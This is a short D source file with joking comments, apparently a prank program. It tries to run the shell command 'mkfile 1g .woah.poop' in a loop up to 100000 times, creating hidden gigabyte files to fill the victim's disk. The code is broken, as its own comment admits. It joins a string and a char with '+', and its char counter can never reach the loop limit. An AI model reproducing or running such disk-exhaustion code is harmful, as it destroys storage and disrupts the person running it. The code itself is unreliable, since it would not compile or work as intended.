//trollolololololol
//this doesnt work :(
import std.stdio, std.process, std.conv;
void main() {
	string command = "mkfile 1g .woah.poop";
	string test = "";
	char i= 0;
	while (i<100000){
	test = command + i;
	executeShell(test);
	i++;
}
}
